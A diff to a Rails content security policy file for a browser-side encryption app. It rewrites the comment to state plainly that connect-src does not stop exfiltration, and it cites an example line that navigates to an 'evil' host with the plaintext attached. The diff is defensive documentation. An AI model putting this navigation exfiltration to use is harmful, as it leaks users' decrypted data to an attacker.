@@ -2,12 +2,19 @@
 
 # counta's whole guarantee is that key material stays in this browser tab, so
 # the cost of any script injection is total: the DEK is in module scope and
-# every decrypted blob is reachable from it. A strict CSP is the backstop for
-# that, on top of escaping every interpolated value (see `esc` in app.js).
+# every decrypted blob is reachable from it. This CSP raises the bar for
+# getting script to run at all — it is NOT containment once it does.
 #
-# connect-src :self is the load-bearing directive — even if script did run, it
-# has nowhere to send the plaintext. There are no third-party origins here by
-# design: no analytics, no CDNs, no fonts (docs/data-privacy.md).
+# Be precise about that, because the opposite is easy to assume: `connect-src`
+# does not stop exfiltration by an executing script. Top-level navigation
+# (`location = "https://evil/" + plaintext`) is not covered by any directive
+# here — `navigate-to` was never shipped by browsers — so a script that runs
+# can still get data out. Treat script execution as total compromise, exactly
+# as the threat model says, and treat this file as defence in depth on top of
+# escaping every interpolated value (`esc` in app.js).
+#
+# There are no third-party origins by design: no analytics, no CDNs, no fonts
+# (docs/data-privacy.md).
 Rails.application.configure do
   config.content_security_policy do |policy|
     policy.default_src :none
